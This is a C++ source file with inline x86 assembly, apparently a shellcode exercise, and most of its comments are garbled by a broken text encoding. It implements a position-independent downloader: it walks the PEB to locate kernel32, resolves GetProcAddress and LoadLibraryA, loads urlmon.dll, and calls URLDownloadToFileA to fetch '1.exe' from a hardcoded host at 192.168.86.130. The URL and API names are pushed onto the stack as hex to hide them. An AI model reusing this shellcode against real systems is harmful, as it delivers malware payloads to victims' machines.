// char* url = "http://192.168.86.130/1.exe";
// filename = "1.exe";

#include <stdio.h> 
#include <Windows.h>
#include<string>


//Ӳ���� URLDownloadToFileA�ĺ�����ַ  ִ���ļ�����
void test2()
{
	_asm
	{
		push ebp
		mov  ebp, esp

		;������� ���ú���  �����ַ�����λ����Ӳ���� �����ϲ�ʱ ��Ҫ���¿���
		mov ebx, 0x00000065;000e
		push ebx;
		mov ebx, 0x78652e31; 31 2e 65 78 1.ex
		push ebx

		xor ebx,ebx
		lea ebx,[esp]

		mov ebx, 0x00657865;exe
		push ebx
		mov ebx, 0x2e312f30;0/1.
		push ebx
		mov ebx, 0x33312e36;31.6
		push ebx
		mov ebx, 0x382e3836;8.86
		push ebx
		mov ebx, 0x312e3239;1.29
		push ebx
		mov ebx, 0x312f2f3a;1//:
		push ebx
		mov ebx, 0x70747468
		push ebx

		xor ebx,ebx
		lea ebx,[esp]

		push 0
		push 0
		xor ebx,ebx
		lea ebx,[esp+24h]
		push ebx

		xor ebx,ebx
		lea ebx,[esp+0ch]
		push ebx

		push 0
		mov ebx,0x6f8241c0   ;������ַ�����޸� ���������ļ� call�������Լ���������
		call ebx


		; �ָ���ջ
		add esp, 0x24; �Լ������ջ
		pop ebp
	}

}



void test()
{
	_asm
	{
		; ��ȡkernel32.dll��ڵ�ַ

		xor ecx, ecx
		mov eax, fs:[ecx + 0x30]; EAX = PEB
		mov eax, [eax + 0xc]; EAX = PEB->Ldr
		mov esi, [eax + 0x14]; ESI = PEB->Ldr.InMemOrder  dll˫������head
		lodsd; EAX = Second module
		xchg eax, esi; EAX = ESI, ESI = EAX;��ʱesi���ǵ�һ��ģ������list
		lodsd; EAX = Third(kernel32)
		mov ebx, [eax + 0x10]; EBX = Base address

		; ����kernel32.dll�ĵ�����
		mov edx, [ebx + 0x3c]; EDX = DOS->e_lfanew
		add edx, ebx; EDX = PE Header ���ϻ���ַ��ȡ���Ե�ַ
		mov edx, [edx + 0x78]; EDX = Offset export table
		add edx, ebx; EDX = Export table
		mov esi, [edx + 0x20]; ESI = Offset namestable
		add esi, ebx; ESI = Names table
		xor ecx, ecx; EXC = 0;ecx����Get_Function��ѭ��������

		; ����GetProcAddress������
		Get_Function:
		inc ecx; Increment the ordinal
			lodsd; Get name offset
			add eax, ebx; Get function name

			cmp dword ptr[eax], 0x50746547; GetP; �ж��ǲ���GetProcAddress
			jnz Get_Function
			cmp dword ptr[eax + 0x4], 0x41636f72; rocA
			jnz Get_Function
			cmp dword ptr[eax + 0x8], 0x65726464; ddre
			jnz Get_Function

			mov esi, [edx + 0x24]; ESI = Offset ordinals
			add esi, ebx; ESI = Ordinals table
			mov cx, [esi + ecx * 2]; Number of function ��ű��д洢��word����Ե�ַ ֻ�������ֽ� cx���Ǻ������
			dec ecx
			mov esi, [edx + 0x1c]; Offset address table
			add esi, ebx; ESI = Address table
			mov edx, [esi + ecx * 4]; EDX = Pointer(offset)  GetProcAddress��ʼ��ַ����Ե�ַ
			add edx, ebx; EDX = GetProcAddress

			; �Ѿ��ҵ�GetProcAddress����ʼ��ַ Ѱ��LoadLibraryA��ʼ��ַ
			xor ecx, ecx; ECX = 0
			push ebx; Kernel32 base address
			push edx; GetProcAddress
			push ecx; 0
			push 0x41797261; aryA
			push 0x7262694c; Libr
			push 0x64616f4c; Load

			push esp; "LoadLibrary"
			push ebx; Kernel32 base address
			call edx; GetProcAddress(LL); ����GetProcAddress����Ѱ��LoadLibrary  call�����Լ���������ջ����ջ����  ����ֵ�洢��eax

			add esp, 0xc; pop "LoadLibrary" ����ִ����ɺ������������
			pop ecx
			pop edx
			pop ebx

			; ����ִ��ǰ����Ĵ���������
			push ebx; basedllimg
			push edx; getproceaddr

			push 0x00006c6c
			push 0x642e6e6f
			push 0x6d6c7255
			push esp; "Urlm on.d ll"
			call eax; LoadLibrary("Urlm on.d ll"); ����LoadLibraryA��������msvcrt.dll

			add esp, 0xc; pop "Urlm on.d ll"
			pop edx; GetProcAddress������ַ
			pop ebx; k32����ַ


			push 0x00004165; �洢"URLDownloadToFileA"
			push 0x6c69466f
			push 0x5464616f
			push 0x6c6e776f
			push 0x444c5255
			push esp
			push eax
			call edx; ���õ���GetProcAddress����Ѱ��URLDownloadToFileA   eax���Ѿ��洢������ַ


			add esp, 0x14; pop "URLDownloadToFileA"


			; ������� ���ú���  �����ַ�����λ����Ӳ���� �����ϲ�ʱ ��Ҫ���¿���
			push 0x00000065; �洢"1.exe"
			push 0x78652e31
			push 0x00657865; �洢"http://192.168..."
			push 0x2e312f30
			push 0x33312e36
			push 0x382e3836
			push 0x312e3239
			push 0x312f2f3a
			push 0x70747468
			push 0; �����Լ����ú���
			push 0
			xor ebx, ebx
			lea ebx, [esp + 24h]
			push ebx
			xor ebx, ebx
			lea ebx, [esp + 0ch]
			push ebx
			push 0
			call eax

			add esp, 0x24;����push���ַ���

	}
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
	PSTR szCmdLine, int iCmdShow)

{
	////MessageBox(NULL, String(233), TEXT("���к�"), MB_CANCELTRYCONTINUE);

	//HINSTANCE LibHandle = LoadLibrary("Urlmon.dll"); //Ҫ��ȡDLL���ڴ��ַ
	//char str[25];
	//itoa((int)LibHandle, str, 16);
	//MessageBox(NULL, (LPCSTR)str, TEXT("���к�"), MB_CANCELTRYCONTINUE);

	//
	//LPTSTR getaddr = (LPTSTR)GetProcAddress(LibHandle, "URLDownloadToFileA"); //��ȡDLL�е���������ַ

	//itoa((int)getaddr, str, 16);
	//MessageBox(NULL, (LPCSTR)str, TEXT("���к�"), MB_CANCELTRYCONTINUE);
	//																		 
 //   //printf("system Address = 0x % x \n", getaddr);


	test();
	return 0;
}



